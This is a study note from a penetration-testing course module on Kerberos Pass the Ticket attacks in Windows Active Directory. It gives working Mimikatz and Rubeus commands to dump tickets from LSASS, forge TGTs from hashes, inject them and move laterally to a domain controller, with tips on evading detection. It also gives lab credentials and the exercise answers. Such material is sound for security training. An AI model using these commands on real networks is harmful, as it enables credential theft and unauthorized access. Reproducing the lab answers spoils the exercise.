# Pass the Ticket (PtT) — Windows

> **Module Section:** 21 / 26 — Password Attacks

## Overview

**Pass the Ticket (PtT)** is an Active Directory lateral movement technique. Instead of using an NTLM hash, it uses a stolen Kerberos ticket to authenticate as another user.

---

## Kerberos Refresher

Kerberos is a ticket-based authentication system. Instead of sending passwords to every service, users receive tickets that prove their identity. Two ticket types matter for PtT attacks.

| Ticket | Purpose |
|--------|---------|
| **TGT** (Ticket Granting Ticket) | First ticket obtained — used to request further service tickets |
| **TGS** (Ticket Granting Service) | Service-specific ticket — presented to a service to authenticate |

### Authentication Flow

1. The client encrypts the current timestamp with their password hash and sends it to the **KDC** (Key Distribution Center — the Domain Controller)
2. The KDC validates the identity and returns a **TGT** (Ticket Granting Ticket)
3. To access a service (e.g., MSSQL), the client presents the TGT to the KDC and receives a **TGS** (Ticket Granting Service ticket)
4. The client presents the TGS to the target service and gets access

---

## PtT Attack Requirements

We need a valid Kerberos ticket, which can be:

- **TGS** — grants access to a specific resource
- **TGT** — allows us to request TGS tickets for any service the user has access to

---

## Harvesting Tickets from Windows

Tickets are stored by the LSASS (Local Security Authority Subsystem Service) process. As a local administrator you can collect all tickets. Without admin rights, you can only see your own.

### Mimikatz — Export All Tickets

```cmd
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```
> Opens Mimikatz, enables debug privileges, and exports all Kerberos tickets from LSASS to `.kirbi` files on disk. Look for files with `krbtgt` in the name — those are TGTs.

Exports `.kirbi` files to disk for every ticket in memory.

#### Ticket Naming Convention

| Filename Pattern | Meaning |
|------------------|---------|
| `[luid]-N-M-flags-USER$@service-...kirbi` | Computer account (trailing `$`) |
| `[luid]-N-M-flags-USER@service-domain.kirbi` | User ticket |
| `*@krbtgt-domain.kirbi` | **TGT** (ticket for the KRBTGT service = the TGT) |

### Rubeus — Export Tickets (Base64)

```cmd
c:\tools> Rubeus.exe dump /nowrap
```
> Dumps all Kerberos tickets from LSASS in Base64 format. `/nowrap` keeps each ticket on a single line for easy copy-paste. Better than Mimikatz on some Windows 10 builds where Mimikatz misreports the encryption type.

Prints ticket in **Base64** instead of writing `.kirbi` files. Use `/nowrap` for easier copy-paste.

> ⚠️ **Admin required** for either tool to collect *all* tickets (not just your own).

> 🐛 **Known issue:** Recent Mimikatz versions may misreport encryption as `des_cbc_md4` on some Windows 10 builds, producing broken exports. Use **Rubeus** instead in those cases.

---

## Pass the Key (OverPass the Hash)

OverPass the Hash converts an NTLM or AES key into a full TGT via Kerberos. This bridges PtH and PtT. Unlike classic PtH (which never touches Kerberos), this technique obtains a real TGT that works with any Kerberos-aware service.

### Extract Kerberos Keys with Mimikatz

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```
> Dumps the encryption keys for all active Kerberos sessions. This gives you the AES256 key alongside the NTLM hash. Use the AES256 key to avoid encryption downgrade detection alerts.

Output includes:
- `aes256_hmac` key
- `rc4_hmac_nt` (= NTLM hash)
- Plus legacy variants

### Mimikatz — OverPass the Hash (requires admin)

```cmd
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
> Uses the NTLM hash to open a new cmd.exe as the target user. Requires local admin. This version does NOT get a TGT — use Rubeus `asktgt` if you need a full Kerberos ticket.

Opens a new `cmd.exe` running under the target user's context.

### Rubeus — `asktgt` (no admin required)

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
> Requests a TGT from the KDC using the user's AES256 key. No admin required. `/nowrap` keeps output on one line for copy-paste. Use `/aes256` instead of `/rc4` to avoid downgrade detection.

| Hash Flag | Key Type |
|-----------|----------|
| `/rc4` | NTLM / RC4_HMAC |
| `/aes128` | AES-128 |
| `/aes256` | AES-256 (recommended — avoids downgrade detection) |
| `/des` | DES (legacy) |

> ⚠️ **Encryption downgrade warning:** Modern AD (2008+ functional level) uses AES by default. Using `rc4_hmac` may trigger detection as an **encryption downgrade**.

| Tool | Admin Required? |
|------|-----------------|
| Mimikatz `sekurlsa::pth` | ✅ Yes |
| Rubeus `asktgt` | ❌ No |

---

## Pass the Ticket

Once you have a ticket, inject it into the current logon session. After injection, the session behaves as the ticket owner for network authentication.

### Rubeus — Request + Import in One Step (`/ptt`)

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
> Requests a TGT and immediately injects it into the current session. `/ptt` (pass-the-ticket) skips saving to disk. Look for `[+] Ticket successfully imported!` in the output.

Look for: `[+] Ticket successfully imported!`

### Rubeus — Import `.kirbi` File

```cmd
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
> Injects a `.kirbi` ticket file into the current session. Replace the filename with the actual `.kirbi` file you exported from Mimikatz.

### Convert `.kirbi` → Base64 (PowerShell)

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```
> Converts a `.kirbi` file to a Base64 string for easy copy-paste or use with Rubeus `/ticket:<base64>`.

### Rubeus — Import Base64 Ticket

```cmd
c:\tools> Rubeus.exe ptt /ticket:<BASE64_TICKET>
```
> Injects a Base64-encoded ticket directly without needing a file on disk. Paste the full Base64 string from the previous conversion step.

### Mimikatz — Import `.kirbi`

```cmd
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\path\to\ticket.kirbi"
```
> Injects a `.kirbi` file into the current session using Mimikatz. After this, run `dir \\DC01\c$` or similar to test that the ticket is working.

### Verify Import

```cmd
c:\tools> dir \\DC01.inlanefreight.htb\c$
```
> Verifies the injected ticket works by listing the DC's C$ share. Use the FQDN, not an IP address — Kerberos matches tickets to hostnames, not IPs.

> 💡 **Tip:** `misc::cmd` in Mimikatz opens a new `cmd.exe` window with the imported ticket — no need to exit and re-run commands.

---

## PtT + PowerShell Remoting (Lateral Movement)

PowerShell Remoting lets you run commands on remote hosts. It uses TCP/5985 (HTTP) and TCP/5986 (HTTPS). After injecting a ticket, you can use PSRemoting to access remote machines without entering credentials again.

### Required Group Membership

To connect via PSRemoting, the user must be:
- **Administrator**, OR
- Member of **Remote Management Users**, OR
- Have explicit PSRemoting permissions

### Mimikatz PtT → PSRemoting

```cmd
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\...\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
mimikatz # exit

c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```
> Injects john's TGT with Mimikatz, then opens a PSRemoting session to DC01. After injection, Kerberos handles authentication automatically — no creds prompt.

### Rubeus — Sacrificial Process + PtT

Create an isolated logon session (Logon Type 9) so we don't trample the current user's TGTs:

```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
> Creates a new logon session (type 9) and opens a cmd.exe in it. This isolates the new TGT from your current session's tickets so you do not overwrite them.

Then from the **new cmd window**, request a TGT and inject:

```cmd
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES256_KEY> /ptt
```
> Requests a TGT using john's AES256 key and injects it into the isolated session created in the previous step. The `/ptt` flag imports immediately without writing a file.

Then pivot:

```cmd
c:\tools> powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```
> Opens a PSRemoting session using the injected ticket. Must use the FQDN `DC01` not an IP address for Kerberos to work.

---

## PtT Method Comparison

| Method | Tool | Admin Required | Input Format |
|--------|------|----------------|--------------|
| Import `.kirbi` | Rubeus `ptt /ticket:` | ❌ | File |
| Import Base64 | Rubeus `ptt /ticket:` | ❌ | String |
| Import `.kirbi` | Mimikatz `kerberos::ptt` | ❌ (for import) | File |
| Request + Inject TGT | Rubeus `asktgt /ptt` | ❌ | Hash / AES key |
| Inject via token | Mimikatz `sekurlsa::pth` | ✅ | Hash |

---

## Defensive Red Flags

- 🚨 **Encryption downgrade** — TGT requested with RC4 when AES is default
- 🚨 **Unusual logon types** — Logon Type 9 (NetCredentials) from random processes
- 🚨 **`krbtgt` TGT export** from non-DC host
- 🚨 **Lateral PSRemoting** (5985/5986) from workstation to DC

---

## Key Takeaways

1. **PtT uses Kerberos tickets**, not NTLM hashes
2. Two ticket types: **TGT** (multi-purpose) vs **TGS** (service-specific)
3. **LSASS holds tickets** — admin rights needed to dump all tickets
4. **Mimikatz `sekurlsa::tickets /export`** → `.kirbi` files
5. **Rubeus `dump /nowrap`** → Base64 tickets (better reliability on some Win10 builds)
6. **OverPass the Hash** = convert a hash/key → TGT (bridges PtH and PtT)
7. **Use AES keys, not RC4**, to avoid encryption downgrade detection
8. **Rubeus `asktgt /ptt`** requests + injects a TGT in one step — **no admin needed**
9. **Mimikatz `kerberos::ptt`** imports a `.kirbi` file into the current session
10. **`createnetonly`** creates a sacrificial process for PtT without trashing the current logon
11. PSRemoting (5985/5986) after PtT → lateral movement to DCs/servers

---

## Exercise

**Target:** `10.129.204.23` (MS01) — RDP `Administrator:AnotherC0mpl3xP4$$`
**Domain:** `inlanefreight.htb` — DC01 reachable via FQDN `DC01.inlanefreight.htb`

### Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | TGTs collected from LSASS (initial dump) | **3** |
| 2 | Flag from `\\DC01.inlanefreight.htb\john\flag.txt` | `Learn1ng_M0r3_Tr1cks_with_J0hn` |
| 3 | Flag from `C:\john\john.txt` via PSRemoting | `P4$$_th3_Tick3T_PSR` |

---

### Q1 — Count TGTs in memory

RDP into MS01 as Administrator and dump tickets:

```cmd
mkdir C:\tickets && cd C:\tickets
C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```
> Creates a working directory and dumps all Kerberos tickets to `.kirbi` files there. Count the files with `krbtgt` in the name — each one is a TGT.

Or with Rubeus (cleaner output, Base64 instead of `.kirbi`):

```cmd
C:\tools\Rubeus.exe dump /service:krbtgt /nowrap
```
> Dumps only TGTs (tickets for the `krbtgt` service). Cleaner than exporting all tickets — use this when you just want to count or harvest TGTs.

Initial dump shows **3 TGTs** for `krbtgt/INLANEFREIGHT.HTB`:
- `DC01$` (LUID `0x39dc9`) — machine account, network logon
- `svc_workstations` (LUID `0x40daf`) — service account
- `DC01$` (LUID `0x3e7`) — machine account, SYSTEM session

> 💡 john's TGT is **not** present initially. The lab uses a scheduled task that authenticates john periodically (~every 1–3 min) — wait for it to fire.

---

### Q2 — PtT to read john's flag from SMB share

**Step 1 — Wait for john's TGT** with a polling loop in PowerShell:

```powershell
cd C:\tickets
while ($true) {
    Remove-Item *.kirbi -ErrorAction SilentlyContinue
    C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit | Out-Null
    $johnTicket = Get-ChildItem *john@krbtgt*.kirbi -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($johnTicket) {
        Write-Host "[+] Found john's TGT: $($johnTicket.Name)" -ForegroundColor Green
        break
    }
    Write-Host "[-] No john TGT yet, waiting 30s... ($(Get-Date -Format HH:mm:ss))"
    Start-Sleep -Seconds 30
}
```
> Polls every 30 seconds: clears old kirbi files, re-dumps tickets, and checks if john's TGT has appeared. John logs in via a scheduled task periodically — this loop catches it when it fires.

Eventually yields e.g. `[0;4f3a1]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi`.

**Step 2 — Inject the ticket** with Mimikatz:

```cmd
C:\tools\mimikatz.exe "privilege::debug" "kerberos::ptt C:\tickets\[0;4f3a1]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi" exit
klist
```
> Injects john's TGT into the current session with Mimikatz, then runs `klist` to confirm. Look for `Client: john @ INLANEFREIGHT.HTB` in the output.

Confirm `Client: john @ INLANEFREIGHT.HTB` with `Cache Flags: 0x1 -> PRIMARY`.

**Step 3 — Enumerate shares on DC01** (Kerberos auth uses cached TGT automatically — must use FQDN):

```cmd
net view \\DC01.inlanefreight.htb
```
> Lists all shares on DC01 using the injected ticket. Must use the FQDN for Kerberos auth. The output shows which share names to use when reading flag files.

Output reveals user-named shares: `carlos`, `david`, `john`, `julio`, `linux01`, `svc_workstations` (no `$` suffix — they're regular shares, not admin shares).

**Step 4 — Read the flag:**

```powershell
type \\DC01.inlanefreight.htb\john\flag.txt
# → Learn1ng_M0r3_Tr1cks_with_J0hn
```
> Reads the flag file over SMB using the injected TGT. Kerberos authenticates automatically — no password prompt.

> ⚠️ **Path gotcha:** Initial guess `\\DC01\john$\flag.txt` fails — share is `john`, not `john$`. Always run `net view` first.

---

### Q3 — PtT + PSRemoting to read `C:\john\john.txt`

With john's TGT still in memory (or re-PtT if evicted), open a remote PowerShell session:

```powershell
Enter-PSSession -ComputerName DC01.inlanefreight.htb
```
> Opens an interactive PSRemoting session to DC01 using the TGT in cache. Kerberos auto-mints a service ticket for HTTP/WSMan. Must use FQDN.

Kerberos auth is automatic — no creds prompted. `klist` after entering shows new service tickets minted on demand:
- `HTTP/DC01.inlanefreight.htb` (WSMan / PSRemoting)
- `cifs/DC01.inlanefreight.htb` (SMB)

Inside the remote session:

```powershell
[DC01.inlanefreight.htb]: PS C:\Users\john\Documents> type C:\john\john.txt
P4$$_th3_Tick3T_PSR
```

**One-shot alternative** (no interactive session):

```powershell
Invoke-Command -ComputerName DC01.inlanefreight.htb -ScriptBlock { type C:\john\john.txt }
```
> Runs a command block on DC01 remotely and returns the output. Useful when you do not need an interactive session.

> 💡 `Enter-PSSession` requires the FQDN for Kerberos SPN lookup — `Enter-PSSession DC01` (short name) may fall back to NTLM and fail without explicit creds.

---

### Lessons Learned

1. **LSASS only holds active session tickets.** If a target user hasn't logged on recently, their TGT won't be in memory — wait for scheduled tasks / triggers.
2. **Polling loops > one-shot dumps** when waiting for periodic logons. Re-dump every 30s and check for the target's `.kirbi` filename pattern.
3. **`sekurlsa::tickets /export`** writes `.kirbi` files named `[LUID]-N-N-FLAGS-USER@SERVICE-DOMAIN.kirbi` — easy to glob.
4. **Always enumerate shares with `net view`** before guessing paths — share names may not match user/host conventions (`john` not `john$`, `Users` not `C$\Users`).
5. **Kerberos requires FQDN.** SPNs are bound to hostnames; using IP or short name forces NTLM fallback.
6. **PSRemoting auto-mints service tickets** (`HTTP/...` for WSMan, `cifs/...` for SMB) once a TGT is loaded — no extra work needed.
7. **`Enter-PSSession` ≠ `Invoke-Command`.** When pasting commands, the typed `exit` runs *before* the remote `type` if pasted as a multi-line block — use `Invoke-Command` for one-shot reliability.
8. **Filename brackets in PowerShell** — `[0;4f3a1]-...` is interpreted as a wildcard. Wrap path in quotes or `cd` into the directory and use just the filename.

---

## References

- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Rubeus OverPass the Hash docs](https://github.com/GhostPack/Rubeus#examples)
- Delpy & Duckwall — *Abusing Microsoft Kerberos — Sorry you guys don't get it*
